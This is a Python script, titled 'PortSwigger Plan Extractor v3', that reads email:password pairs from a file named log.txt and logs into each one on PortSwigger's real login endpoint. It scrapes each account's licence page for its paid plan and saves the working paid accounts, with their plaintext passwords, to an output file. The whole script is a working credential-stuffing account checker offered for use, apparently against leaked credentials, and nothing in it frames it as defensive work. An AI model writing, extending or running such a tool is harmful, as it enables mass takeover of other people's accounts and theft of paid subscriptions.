#!/usr/bin/env python3
"""
PortSwigger Plan Extractor v3 - Minimal approach with direct credential submission
Focus on simplicity and reliability
"""

import requests
import re
import sys
from datetime import datetime

INPUT_FILE = "log.txt"
OUTPUT_FILE = "portswigger_paid_accounts.txt"
FAILED_FILE = "portswigger_account_failures.txt"

LOGIN_URL = "https://portswigger.net/users"
LOGIN_POST_URL = "https://login.portswigger.net/u/login"
LICENSES_URL = "https://portswigger.net/users/youraccount/licenses"

class PortSwiggerChecker:
    def __init__(self):
        self.session = requests.Session()
        # Use minimal but complete headers
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Connection': 'keep-alive',
        }

    def get_login_form(self):
        """Get login form and extract required fields"""
        try:
            resp = self.session.get(LOGIN_URL, timeout=10)
            if resp.status_code != 200:
                return None, f"GET_error_{resp.status_code}"

            # Extract state parameter
            state_match = re.search(r'name=["\']?state["\']?[^>]*value=["\']?([^"\'>\s]+)', resp.text)
            if not state_match:
                # Try alternative pattern
                state_match = re.search(r'state["\']?\s*=\s*["\']?([^"\'>\s,;]+)', resp.text)
            if not state_match:
                return None, "no_state"

            return state_match.group(1), None
        except Exception as e:
            return None, f"form_error_{type(e).__name__}"

    def submit_login(self, email, password, state):
        """Submit login credentials"""
        try:
            payload = {
                'state': state,
                'username': email,
                'password': password,
                'action': 'default'
            }

            resp = self.session.post(
                LOGIN_POST_URL,
                data=payload,
                timeout=10,
                allow_redirects=True
            )

            if resp.status_code >= 400:
                return f"POST_http_{resp.status_code}"

            # Check for error messages
            if "wrong" in resp.text.lower() or "invalid" in resp.text.lower():
                return "credentials_invalid"

            # Check if still on login page (indicates failed login)
            if "state" in resp.text and LOGIN_POST_URL in resp.url:
                return "login_page_returned"

            return None  # Login successful

        except requests.exceptions.Timeout:
            return "timeout"
        except requests.exceptions.ConnectionError:
            return "connection_error"
        except Exception as e:
            return f"post_error_{type(e).__name__}"

    def get_plan(self):
        """Retrieve subscription plan from licenses page"""
        try:
            resp = self.session.get(LICENSES_URL, timeout=10)

            if resp.status_code == 401 or resp.status_code == 403:
                return None, "not_authorized"

            if resp.status_code != 200:
                return None, f"access_{resp.status_code}"

            # Check for no subscriptions
            if "no subscriptions" in resp.text.lower():
                return None, None  # Free account, not an error

            # Extract plan type
            for plan in ["Enterprise", "Professional", "Community"]:
                if plan in resp.text:
                    return plan, None

            # If license info exists but plan not identified
            if "license" in resp.text.lower() or "subscription" in resp.text.lower():
                return "Unknown", None

            return None, None  # Free account

        except requests.exceptions.Timeout:
            return None, "timeout"
        except requests.exceptions.ConnectionError:
            return None, "connection_error"
        except Exception as e:
            return None, f"access_error_{type(e).__name__}"

    def check_account(self, email, password):
        """Check a single account"""
        # Get login state
        state, error = self.get_login_form()
        if error:
            return None, error

        # Submit login
        login_error = self.submit_login(email, password, state)
        if login_error:
            return None, login_error

        # Get subscription plan
        plan, plan_error = self.get_plan()
        if plan_error:
            return None, plan_error

        return plan, "success"

def read_credentials(filename):
    """Read email:password pairs from file"""
    creds = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#') and ':' in line:
                    creds.append(line)
        return creds
    except FileNotFoundError:
        print(f"ERROR: {filename} not found")
        sys.exit(1)

def main():
    print("[*] PortSwigger Plan Extractor v3 (Minimal)")
    print(f"[*] Input: {INPUT_FILE}")
    print(f"[*] Output: {OUTPUT_FILE}")
    print(f"[*] Failures: {FAILED_FILE}")
    print()

    # Load credentials
    print("Loading credentials...")
    creds = read_credentials(INPUT_FILE)
    print(f"✓ Loaded {len(creds)} credentials\n")

    if not creds:
        print("ERROR: No credentials loaded")
        sys.exit(1)

    # Process credentials
    print("Checking accounts...")
    checker = PortSwiggerChecker()

    paid = []
    failed = []
    error_counts = {}

    for i, cred in enumerate(creds, 1):
        email, password = cred.split(':', 1)
        sys.stdout.write(f"\r[{i}/{len(creds)}] Paid: {len(paid)} | Failed: {len(failed)}")
        sys.stdout.flush()

        plan, result = checker.check_account(email, password)

        if plan:
            paid.append((email, password, plan))
        else:
            failed.append((email, password, result))
            error_counts[result] = error_counts.get(result, 0) + 1

    print(f"\r[{len(creds)}/{len(creds)}] Paid: {len(paid)} | Failed: {len(failed)}    \n")

    # Write results
    print("Writing results...")
    with open(OUTPUT_FILE, 'w') as f:
        f.write(f"# Paid Accounts (email|password|plan)\n")
        f.write(f"# {datetime.now().isoformat()}\n")
        f.write(f"# Total: {len(paid)}\n#\n")
        for email, password, plan in paid:
            f.write(f"{email}|{password}|{plan}\n")

    with open(FAILED_FILE, 'w') as f:
        f.write(f"# Failed/Free Accounts\n")
        f.write(f"# {datetime.now().isoformat()}\n")
        f.write(f"# Total: {len(failed)}\n#\n")
        for email, password, error in failed:
            f.write(f"{email}:{password} # {error}\n")

    print(f"✓ {OUTPUT_FILE}: {len(paid)} accounts")
    print(f"✓ {FAILED_FILE}: {len(failed)} accounts")

    if error_counts:
        print("\nError breakdown:")
        for error, count in sorted(error_counts.items(), key=lambda x: -x[1])[:5]:
            print(f"  {error}: {count}")

    print(f"\nSummary: {len(paid)}/{len(creds)} paid ({100*len(paid)//len(creds)}%)")

if __name__ == "__main__":
    main()
